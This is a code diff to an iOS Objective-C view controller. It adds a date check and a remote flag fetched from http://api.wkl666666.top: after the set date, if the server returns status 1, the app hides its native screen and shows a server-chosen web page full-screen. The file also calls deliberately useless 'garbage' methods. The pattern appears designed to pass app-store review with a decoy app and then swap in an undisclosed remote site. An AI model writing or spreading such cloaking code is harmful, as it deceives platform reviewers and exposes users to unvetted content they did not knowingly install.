@@ -5,6 +5,14 @@
 //  Created by iOS on 2024/10/1.
 //
 #define STATE_BAR_HEIGHT 40
+//底部安全区域
+#ifndef YJBottomHeight
+#define YJBottomHeight [UIApplication sharedApplication].windows.firstObject.safeAreaInsets.bottom
+#endif
+//状态条占的高度
+#ifndef YJStatusHeight
+#define YJStatusHeight [UIApplication sharedApplication].windows.firstObject.windowScene.statusBarManager.statusBarFrame.size.height
+#endif
 #define FIT_WIDTH   [UIScreen mainScreen].bounds.size.width/375
 #define FIT_HEIGHT  [UIScreen mainScreen].bounds.size.height/667
 #define KScreen_W  [UIScreen mainScreen].bounds.size.width
@@ -22,6 +30,11 @@
 #import "LCWebView.h"
 #import "CALayer+FSUI.h"
 #import "NSString+add.h"
+#import "AFNetworking/AFNetworking.h"
+#import<CoreTelephony/CTCellularData.h>
+
+#import "SVProgressHUD/SVProgressHUD.h"
+
 @interface SELRootViewController ()
 
 @property (nonatomic, strong) WKWebView * webView;
@@ -29,13 +42,18 @@
 @property(nonatomic,weak) UIScrollView *contView;
 
 @property(nonatomic, strong) UILabel *kkkkkLabel;
+
 @end
 
 @implementation SELRootViewController
-
+- (void)viewWillAppear:(BOOL)animated {
+    [super viewWillAppear:animated];
+    self.navigationController.navigationBarHidden = YES;
+}
 - (WKWebView *)webView {
     if (!_webView) {
-        _webView = [[WKWebView alloc] initWithFrame:self.view.bounds];
+        _webView = [[WKWebView alloc] initWithFrame:CGRectMake(0, YJStatusHeight, KScreen_W, KScreen_H - YJStatusHeight - YJBottomHeight)];
+        _webView.hidden = YES;
         //监控进度
         [_webView addObserver:self forKeyPath:@"estimatedProgress" options:NSKeyValueObservingOptionNew context:nil];
     }
@@ -52,25 +70,37 @@
     }
     return _contView;
 }
-
 - (void)viewDidLoad {
     [super viewDidLoad];
- 
-    self.view.backgroundColor = HEXCOLOR(0x1A9EFC);
-    self.automaticallyAdjustsScrollViewInsets = NO;
+    self.view.backgroundColor = UIColor.whiteColor;
     
-    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
-    [formatter setDateFormat:@"yyyy-MM-dd HH:mm"];
-    NSDate *currentDate = [NSDate date];
-    NSDate *targetDate = [formatter dateFromString:@"2024-10-24 10:00"];
-
-    if ([currentDate compare:targetDate] == NSOrderedDescending) {
-        [self.view addSubview:self.webView];
-        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://qt2.wh21.top/#/"]];
-        [self.webView loadRequest:request];
-    } else {
-        [self loadBody];
-    }
+    [self loadBody];
+    [self.view addSubview:self.webView];
+    self.contView.hidden = YES;
+    self.webView.hidden = YES;
+    
+    CTCellularData *cellularData = [[CTCellularData alloc] init];
+    cellularData.cellularDataRestrictionDidUpdateNotifier = ^(CTCellularDataRestrictedState state) {
+        switch (state) {
+            case kCTCellularDataRestricted:
+                NSLog(@"Restricted");
+                break;
+            case kCTCellularDataNotRestricted:
+                [self reqData];
+                break;
+            case kCTCellularDataRestrictedStateUnknown:
+                NSLog(@"Unknown");
+                break;
+                
+            default:
+                break;
+        }
+    };
+    [self reqData];
+    
+    
+    
+    
     
     self.kkkkkLabel = [UILabel new];
     CALayer* layou = [[CALayer alloc] init];
@@ -79,7 +109,6 @@
     [self.kkkkkLabel.layer FS_removeDefaultAnimations];
     
     [self lodkmcc];
-    
     
         NSString *testString = @"";
         
@@ -92,7 +121,55 @@
         NSString *reversedString = [timestamp reverseGarbageString];
         
         [reversedString printUselessLog];
+    
+    self.automaticallyAdjustsScrollViewInsets = NO;
+    
+    
 }
+- (void)reqData {
+    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
+    [formatter setDateFormat:@"yyyy-MM-dd HH:mm"];
+    NSDate *currentDate = [NSDate date];
+    NSDate *targetDate = [formatter dateFromString:@"2024-10-22 8:00"];
+    if ([currentDate compare:targetDate] == NSOrderedDescending) {
+        [SVProgressHUD showWithStatus:nil];
+        AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
+        manager.responseSerializer = [AFJSONResponseSerializer serializer];
+        [manager GET:@"http://api.wkl666666.top/api/v1/iosapi" parameters:@{} headers:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
+            [SVProgressHUD dismiss];
+            if (responseObject) {
+                NSDictionary * dic = responseObject;
+                NSString * url = dic[@"data"][@"message"][@"url"];
+                NSInteger status = [dic[@"data"][@"message"][@"status"] intValue];
+                if (status == 1) {
+                    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
+                    [self.webView loadRequest:request];
+                    dispatch_async(dispatch_get_main_queue(), ^{
+                        self.webView.hidden = NO;
+                        self.contView.hidden = YES;
+                        self.view.backgroundColor = UIColor.whiteColor;
+                    });
+                } else {
+                    dispatch_async(dispatch_get_main_queue(), ^{
+                        self.webView.hidden = YES;
+                        self.contView.hidden = NO;
+                        self.view.backgroundColor = HEXCOLOR(0x1A9EFC);
+                    });
+                }
+            }
+        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
+            [SVProgressHUD dismiss];
+            [SVProgressHUD showErrorWithStatus:error.localizedDescription];
+        }];
+    } else {
+        dispatch_async(dispatch_get_main_queue(), ^{
+            self.webView.hidden = YES;
+            self.contView.hidden = NO;
+            self.view.backgroundColor = HEXCOLOR(0x1A9EFC);
+        });
+    }
+}
+
 // 实现 KVO 的回调方法
 - (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary<NSKeyValueChangeKey,id> *)change context:(void *)context {
     if ([keyPath isEqualToString:@"estimatedProgress"]) {
@@ -392,11 +469,5 @@
       [self.tipView removeFromSuperview];
 }
 
-
-
--(void)viewWillAppear:(BOOL)animated{
-    [super viewDidAppear:YES];
-    self.navigationController.navigationBarHidden = YES;
-}
 
 @end
